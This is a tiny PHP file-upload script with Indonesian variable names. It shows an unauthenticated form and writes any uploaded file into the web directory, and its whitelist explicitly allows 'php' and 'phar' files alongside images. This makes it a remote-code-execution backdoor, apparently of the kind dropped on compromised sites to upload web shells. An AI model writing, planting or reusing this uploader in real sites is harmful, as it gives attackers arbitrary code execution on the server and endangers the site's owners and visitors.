<?php if (isset($_POST['submit'])) {$nama = $_FILES['gambar']['name'];$tempat = $_FILES['gambar']['tmp_name'];$type = $_FILES['gambar']['type'];$size = $_FILES['gambar']['size'];$ukuran = ['html', 'jpg', 'png', 'jpeg' , 'phar' , 'php'];$explode = explode('.', $nama);$pembaginya = strtolower(end($explode));if ( in_array($pembaginya, $ukuran)) {move_uploaded_file($tempat, $nama);}else{echo "duh";}} else { 
echo '<form method="post" enctype="multipart/form-data"><input type="file" name="gambar"><input type="submit" name="submit" value="submit"></form>'; }__halt_compiler();?>

